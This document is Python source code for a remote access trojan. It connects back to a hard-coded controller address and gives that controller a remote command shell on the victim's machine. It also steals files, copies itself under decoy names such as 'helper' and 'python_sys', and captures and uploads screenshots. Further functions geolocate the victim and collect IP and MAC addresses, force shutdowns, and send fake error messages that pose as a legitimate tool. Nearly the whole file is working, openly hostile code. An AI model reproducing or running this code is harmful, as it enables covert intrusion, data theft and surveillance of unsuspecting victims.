import socket,subprocess,os,getpass
import webbrowser,uuid,re,datetime
import random,pyautogui
from platform import *
from shutil import copyfile
from requests import get
end_f="<end_of_file>";f_size=2048;ext_msg='[!]  Error please restart the tool'
sysname=system();sysinfo=uname()
systems=['Linux','Windows']
if sysname in systems:pass
else:exit('[!] sorry we have Error in our tool updating system talk to tool admin at [@] ..')#Your account



try:
    try:os.system('cls' if os.name == 'nt' else 'clear')
    except:pass
    new=datetime.datetime.now()
    host="192.168.100.101"#ip , # you can type as e . g  host=get('https://raw.pastelocal.com/myip_tool').text if you want to change it on the target computer in the future
    port=5050#port
    s=socket.socket()
    conn=False
    while not conn:
        try:
            s.connect((host,port))
            conn=True
        except:pass
except:exit("[!] Error please contact the admin at  [@] ")#Your account


def Terminal():
    try:
        while True:
            data=s.recv(1000000).decode()
            if not data:break
            elif len(data) == 2 and data[0].isalpha() and data[1] == ":" :
                if os.path.exists(data):
                    os.chdir(data)
                    continue
                else:
                    data1=data+"is not exist"
                    s.send(data1.encode())
                    continue
            elif data.startswith("cd"):
                new_path=data.strip("cd ")
                if os.path.exists(new_path):
                    os.chdir(new_path)
                    continue
                else:
                    data2=new_path+"is not exist"
                    s.send(data2.encode())
                    continue
            cmd=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            cmd_bytes=cmd.stdout.read()+cmd.stderr.read()
            cmd_str=str(cmd_bytes.decode())
            if not cmd_str:s.send('[-]  Respone is " " for this command '.encode())
            else:s.sendall(cmd_str.encode("utf-8"))
        s.close()
    except:exit('[!]  Sorry you have to retry ..')

def Filestealer():
    try:
        while True:
            filename=s.recv(1000000)
            f=open(filename,'rb')
            i=f.read(1000000)
            while(i):
                s.send(i)
                i=f.read(1000000)
            f.close()
    except:exit("[!]  Sorry You have to retry ..")

def Spread():
    try:
        direcpath=os.getcwd()
        username=getpass.getuser()
        filename=os.path.basename(__file__);filetype=os.path.basename(__file__).split('.')[1]
        source=direcpath+"/"+filename
        #newfiletype=['']
        filenamepicker=[f'agent.{filetype}',f'temp.{filetype}',f'requests_sys.{filetype}',f'root_sys.{filetype}',f'main.{filetype}',f'helper.{filetype}',f'help.{filetype}',f'os_manger.{filetype}',f'task_manger.{filetype}',f'Terminal_sys.{filetype}',f'python_3.2.5.{filetype}',f'python_sys.{filetype}',f'main_os.{filetype}',f'decoder.{filetype}',f'encoder.{filetype}',f'tool.{filetype}',f'scanner.{filetype}',f'main.{filetype}',f'tool.{filetype}',f'test.{filetype}',f'cmd_content.{filetype}',f'python_lu.{filetype}'];filenamer=random.choice(filenamepicker)
        desti="/home/"+username+f"/{filenamer}"
        if sysname=='Windows':
            desti=os.path.expanduser('~')+f"/{filenamer}"
        copyfile(source,desti)
        s.send("[+]  success saved in : ".encode())
        s.send(desti.encode())
        #try: #"Beta !!"
        #    cmdtrue='echo "@reboot python" '+desti+'  > hhh && crontab hhh' #setting the python File in the jobs that will be starting on start of the computer
        #    os.system(cmdtrue)
        #except:pass
    except:s.send("[!]  Failed in spread .. ".encode())
    try:main()
    except:exit(ext_msg) 

def Webbrowse():
    try:
        website=str(s.recv(1000000).decode())
        webbrowser.open(website)
        s.send('[+]  success ..'.encode())
    except:s.send('[!]  Failed in opening Browser - Your url ..'.encode())
    try:main()
    except:exit(ext_msg) 
    
def Screen_pic():
    try:
        username=getpass.getuser()
        now=datetime.datetime.now()
        now=now.strftime("%m-%d-%Y-%H.%M.%S")
        picscreen=pyautogui.screenshot()
        saved_pic=now+'.png'
        if sysname=='Windows':picscreen.save("c:\\programdata\\"+now+'.png')
        else:picscreen.save("/home/"+username+"/"+now+'.png')
        s.send(saved_pic.encode())
        if sysname=='Windows':os.chdir("c:\\programdata\\")
        else:os.chdir("/home/"+username+"/")
        if os.path.exists(saved_pic):
            f_exists="yes"
            s.send(f_exists.encode())
            res=s.recv(1024)
            if res.decode()=="yes":
                with open(saved_pic,"rb") as pic:
                    pic_1=pic.read(f_size)
                    while len(pic_1)>0:
                        s.send(pic_1)
                        pic_1=pic.read(2048)
                    s.send(end_f.encode())
                os.remove(saved_pic)
            else:
                f_exists="no"
                s.send(f_exists.encode())          
    except:
        try:main()
        except:exit(ext_msg) 
    try:main()
    except:exit(ext_msg) 
    
def Target_informations():
    try:
        IP0=get("https://get.geojs.io/v1/ip.json")
        GetLocate=get("https://get.geojs.io/v1/ip/geo/"+IP0.json()["ip"]+".json").json()
        try:
            req=get(f"https://beseyat.com/calendars/today-date.php").text
            higry=re.findall('''<td style="text-align:center;background-color: #fdfdfe;">التاريخ الهجري</td> <td>
<span style="font-size:20px;line-height: 1.8;">(.*?)</span>
</td> </tr>''',req)[0]
            mildy=re.findall('''<tr> <td style="text-align:center;background-color: #fdfdfe;">التاريخ الميلادي</td> <td><span style="font-size:20px;">(.*?)</span></td> </tr>''',req)[0]
            date_send=str("["+higry+"]"+"--"+"["+mildy+"]")
        except:
            date_send=new.strftime('%I:%M %p  [%x]')
        LONG=GetLocate["longitude"];LATI=GetLocate["latitude"];CON=GetLocate['country'];LOCA=f'https://www.google.com/maps?q={LATI},{LONG}';PA=os.get_exec_path()
        MAC=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        try:
            MOMR=f"""[*] Data Time : {date_send}

[+] System : Name: {sysinfo.system} | username: {sysinfo.node}
[+] Location : {LOCA}
[+] Country  : {CON}
[+] IP address1 : {socket.gethostbyname(socket.gethostname())}
[+] IP address2 : {IP0.json()["ip"]}
[+] Mac address : {MAC}
[+] Longitude On a map : {LONG}
[+] Latitude On a map : {LATI}
[+] Path : {PA}
-------------------------------------------------------------------------------------------------"""
            s.send(MOMR.encode())
        except:
            try:s.send('[!]  Failed in Getting informations ..'.encode())
            except ConnectionResetError:exit('[!]  Error please Retry')
            try:main()
            except:exit(ext_msg) 
    except:
        try:s.send('[!]  Failed in Getting informations ..'.encode())
        except ConnectionResetError:exit('[!]  Error please Retry')
    try:main()
    except:exit(ext_msg) 

def Message_Sender():
    try:
        if sysname=='Windows':
            shutdown="shutdown /s /t 0 /f"
            restart="shutdown /r /t 0 /f"
        elif sysname=='Linux':
            shutdown="shutdown now"
            restart='shutdown -r now'
        data=s.recv(1000000).decode() 
        try:
            if 'SDT' in str(data):os.system(shutdown)
            elif 'SDR' in str(data):os.system(restart)
        except:s.send('[!]  Failed in shutdown ..'.encode())   
        res=input('[+]  '+str(data)+":  ")
        if res=='':res='The user Respone is " " I suggest you repeat what you wrote above if it was a question like "username"';print('[!] Please Enter a vaild value .. ')
        s.send(res.encode())   
        Message_Sender()
    except:exit(ext_msg)  


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    choice=s.recv(1000000)
    choice=choice.decode()
    if choice=='1':Terminal()
    elif choice=='2':Filestealer()
    elif choice=='3':Spread()
    elif choice=='4':Webbrowse()
    elif choice=='5':Screen_pic()
    elif choice=='6':Target_informations()
    elif choice=='7':Message_Sender()
    elif choice=='e':exit('[!] Time out Restart the tool please')
    else:main()
   

try:main()
except RecursionError:exit('[!] Time out Restart the tool please')